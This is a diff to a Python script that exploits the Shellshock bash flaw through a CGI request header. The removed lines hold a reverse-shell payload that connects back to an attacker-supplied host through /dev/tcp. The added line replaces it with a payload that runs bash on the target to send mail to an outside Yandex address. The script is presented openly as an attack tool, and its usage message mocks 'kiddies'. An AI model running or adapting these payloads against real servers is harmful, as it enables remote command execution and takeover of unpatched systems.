@@ -5,14 +5,14 @@
 
 import httplib,urllib,sys
 
-if (len(sys.argv)<4):
+if (len(sys.argv)<3):
 	print "Welcome, my little kiddy..."
-	print "Usage: %s <host> <vulnerable CGI> <attackhost/IP>" % sys.argv[0]
-	print "Example: %s localhost /cgi-bin/test.cgi 10.0.0.1/8080" % sys.argv[0]
+	print "Usage: %s <host> <vulnerable CGI>" % sys.argv[0]
+	print "Example: %s localhost /cgi-bin/test.cgi" % sys.argv[0]
 	exit(0)
 
 conn = httplib.HTTPConnection(sys.argv[1])
-reverse_shell="() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % sys.argv[3]
+reverse_shell="() { ignored;}; bash -c 'mail -s \"Some Subj\" markhost@yandex.ru'"
 
 headers = {"Content-type": "application/x-www-form-urlencoded",
 	"test":reverse_shell }
